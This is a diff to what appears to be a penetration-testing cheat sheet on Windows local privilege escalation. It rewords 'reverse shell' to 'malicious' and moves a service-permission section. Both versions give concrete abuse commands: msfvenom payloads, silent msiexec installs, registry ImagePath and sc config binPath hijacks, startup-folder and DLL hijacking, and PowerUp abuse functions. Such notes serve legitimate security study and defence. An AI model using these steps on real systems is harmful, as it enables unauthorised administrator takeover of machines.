@@ -681,14 +681,14 @@ runas /user:DOMAIN\Administrator /savecred "cmd.exe /c whoami"
 - Autorun  
 
 Check with sysinternal tools [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) and [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), run `Autoruns64.exe` to look for autorun specs in HKLM and `accesschk64.exe -wvu $PROG` to check if `FILE_ALL_ACCESS` for `Everyone` is set.  
-Replace the program with a reverse shell (msfvenom will be handy). Program will be run next time an administrator logs in, giving an admin shell on listener.  
+Replace the program with a malicious one (msfvenom will be handy), it will be run next time an administrator logs in.
 
 With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ModifiableRegistryAutoRun`.  
 
 - AlwaysInstallElevated  
 
 Check in registry with `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` and `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` if `AlwaysInstallElevated` is set to 1.  
-Create msi reverse shell with msfvenom and execute with `msiexec /quiet /qn /i c:\path\rev.msi`.  
+Create malicious msi with msfvenom and execute it with `msiexec /quiet /qn /i c:\path\rev.msi`.  
 
 With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-RegAlwaysInstallElevated` and abuse with `Write-UserAddMSI` to create local admin.  
 
@@ -696,17 +696,11 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 Check with `Get-Acl -Path HKLM:\System\CurrentControlSet\services\regsvc |fl` if current user has `FullControl` on registry key.  
 
-If so, make .exe reverse shell with msfvenom and change the registry key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\path\rev.exe /f` and start service with `sc start regsvc`.  
+If so, make malicious .exe with msfvenom and change the registry key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\path\rev.exe /f` and start service with `sc start regsvc`.  
 
-- Insecure service permissions  
+- Insecure service file permissions  
 
-Check with `accesschk64.exe -uwcqv *` if you are member of any group. You can restrict output by supplying group parameter, like `accesschk64.exe -uwcqv "Everyone" *`. Look for `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`, `GENERIC_WRITE`, `GENERIC_ALL`, `WRITE_DAC` or `WRITE_OWNER` permissions.  
-If so, you can reconfigure service and supply reverse shell executable made with msfvenom as parameter :
-```
-sc config $SERVICE binPath= "c:\path\rev.exe"
-net stop $SERVICE
-net start $SERVICE
-```
+Check with `accesschk64.exe -wvu *` if `Everyone` has `FILE_ALL_ACCESS` permission on a service executable. If so, you can replace the executable by a malicious one to privesc.  
 
 With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ServiceFilePermission` and abuse with `Install-ServiceBinary`.  
 
@@ -714,13 +708,24 @@ With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerU
 
 Check with `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` if you have access, for example (F) for Full Access, to the directory.  
 
-If so, place reverse shell executable in directory, log off and wait for an admin to log in, giving an admin shell on listener.  
+If so, place malicious executable in directory and log off. Next time an admin logs in, the payload will be executed.  
 
 - DLL hijacking  
 
-Check with sysinternals tools [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) by applying the filters `Result` is `NAME NOT FOUND` and `Path` ends with `.dll`. If a location found is writable, it can be abused by replacing the missing dll with a crafted one (with msfvenom) and restarting the service to get a reverse shell or add local admin.  
+Check with sysinternals tools [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) by applying the filters `Result` is `NAME NOT FOUND` and `Path` ends with `.dll`. If a location found is writable, it can be abused by replacing the missing dll with a crafted one (with msfvenom) and restarting the service to execute payload.  
 
 With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Find-DLLHijack` and `Find-PathHijack` and abuse with `Write-HijackDll`.  
+
+- Insecure service permission (binpath)
+
+Similar to a previous one, check with `accesschk64.exe -uwcv Everyone *` if you have RW permission on some service. If so, you can reconfigure service and supply malicious executable as parameter :
+```
+sc config $SERVICE binPath= "c:\path\rev.exe"
+net stop $SERVICE
+net start $SERVICE
+```
+
+With [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1), check with `Get-ServicePermission` and abuse with `Invoke-ServiceAbuse`.  
 
 - Alternative to executables  
 
